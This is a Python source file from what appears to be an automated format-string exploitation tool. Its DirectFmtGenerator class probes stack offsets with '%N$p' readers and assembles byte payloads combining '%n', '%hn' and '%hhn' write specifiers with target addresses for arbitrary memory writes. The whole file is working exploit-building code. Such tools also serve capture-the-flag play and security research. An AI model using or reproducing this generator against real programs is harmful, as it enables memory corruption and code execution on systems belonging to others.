import exceptions


class DirectFmtGenerator:
    def __init__(self):
        self.writers = list()
        self.writers_backup = list()

        self.direct_parameter_num = 1

        self.align_padding = ""

        self.temp_address = ""
        self.address = None

    def generate_next_fmt_for_find_pattern(self, max_length):
        parameters = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""

        if len(parameters) > max_length:
            raise exceptions.InputTooLittleError
        else:
            dim = len(parameters) + len(self.temp_address)
            reader_count = 1
            while True:
                reader = "%" + str(self.direct_parameter_num) + "$p"
                if len(reader) + dim > max_length:
                    break
                else:
                    reader_count += 1
                    self.direct_parameter_num += 1
                    dim += len(reader)
                    parameters += reader

            if reader_count >= 2:
                padding = "G" * (max_length - dim)
                return self.temp_address + parameters + padding
            else:
                raise exceptions.InputTooLittleError

    def generate_next_fmt_for_find_pattern_segfault(self, max_length):
        if self.direct_parameter_num > 1:
            parameters = "%" + str(self.direct_parameter_num - 1) + "$p" + "%" + str(self.direct_parameter_num) + "$p"
        else:
            parameters = "%" + str(self.direct_parameter_num) + "$p" + "%" + str(self.direct_parameter_num + 1) + "$p"

        if len(self.temp_address + parameters) <= max_length:
            self.direct_parameter_num += 1
            padding = "G" * (max_length - len(self.temp_address + parameters))
            return self.temp_address + parameters + padding
        else:
            raise exceptions.InputTooLittleError

    def generate_next_fmt_for_find_pattern_markers_not_found(self, max_length):
        parameters = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""

        address_size = len(self.temp_address)
        effective_len = len(parameters) + address_size
        printed_len = address_size + (2 + (address_size * 2) if parameters != "" else 0)

        print("effective_len = " + str(effective_len))
        print("printed_len = " + str(printed_len))
        if printed_len >= max_length:
            raise exceptions.InputTooLittleError
        else:
            reader_count = 1
            while True:
                reader = "%" + str(self.direct_parameter_num) + "$p"

                if printed_len + 2 + (address_size * 2) > max_length:
                    break
                else:
                    reader_count += 1
                    self.direct_parameter_num += 1
                    printed_len += 2 + (address_size * 2)
                    effective_len += len(reader)
                    parameters += reader

            if reader_count < 2:
                raise exceptions.InputTooLittleError
            else:
                padding_printed_len = "G" * (max_length - printed_len)
                padding_effective_len = "G" * (max_length - (effective_len + len(padding_printed_len)))

                return [self.temp_address + parameters + padding_printed_len, padding_effective_len]

    def generate_fmt_for_find_end(self):
        writers = ""

        for w in self.writers:
            writers += w[0] + w[1] + w[2].replace("ln", "p.").replace("hhn", "p..").replace("hn", "p.").replace("n",
                                                                                                                "p")

        return writers + self.align_padding + self.temp_address * len(self.address)

    def generate_final_fmt(self, shift_for_broken_pattern, input_len):
        writers = ""

        for w in self.writers:
            writers += "V" * len(w[0]) + w[1] + w[2].replace("ln", "p.").replace("hhn", "p..").replace("hn",
                                                                                                       "p.").replace(
                "n",
                "p")
        shift_padding = "C" * shift_for_broken_pattern

        addresses = self.temp_address * len(self.writers)

        return writers + shift_padding + addresses + "C" * (input_len - len(writers + shift_padding + addresses))

    def generate_exploit_fmt_in_byte(self, input_len, markers_0, input_type):
        writers = ""

        for w in self.writers:
            writers += w[0] + w[1] + w[2]

        addresses = b""
        for addr in self.address:
            addresses += addr

        final_padding = "C" * (input_len - len(writers + self.align_padding + (self.temp_address * len(self.address))))

        if input_type == "execution_input":
            return writers.encode() + self.align_padding.encode() + addresses, len(writers + self.align_padding + self.temp_address * len(self.address))
        else:
            return writers.encode() + self.align_padding.encode() + markers_0.encode() + addresses + final_padding.encode(), len(writers + self.align_padding + markers_0 + self.temp_address * len(self.address) + final_padding)

    def generate_exploit_fmt_in_byte_address_first(self, input_len, markers_0, input_type):
        writers = ""

        for w in self.writers:
            #writers += "-----" + w[1] + w[2].replace("n", "p")
            writers += w[0] + w[1] + w[2]

        addresses = b""
        for addr in self.address:
            addresses += addr

        final_padding = "C" * (input_len - len(writers + self.align_padding + (self.temp_address * len(self.address))))

        if input_type == "execution_input":
            return self.align_padding.encode() + addresses + writers.encode(), len(self.align_padding + self.temp_address * len(self.address) + writers)
        else:
            return markers_0.encode() + self.align_padding.encode() + addresses + writers.encode() + final_padding.encode(), len(markers_0 + self.align_padding + self.temp_address * len(self.address) + writers + final_padding)

    def set_direct_parameter_num(self, num):
        self.direct_parameter_num = num

    def reset_direct_parameter_num(self):
        self.direct_parameter_num = 1

    def add_writer(self, writer):
        self.writers.append(writer)

    def set_writer_backup(self):
        self.writers_backup = self.writers[:]

    def set_align_padding(self, align_padding):
        self.align_padding = align_padding

    def set_temp_address(self, temp_address):
        self.temp_address = temp_address

    def set_address(self, address):
        self.address = address

    def restore_writers(self):
        self.writers.clear()
        self.writers = self.writers_backup[:]

    def reset_align_padding(self):
        self.align_padding = ""
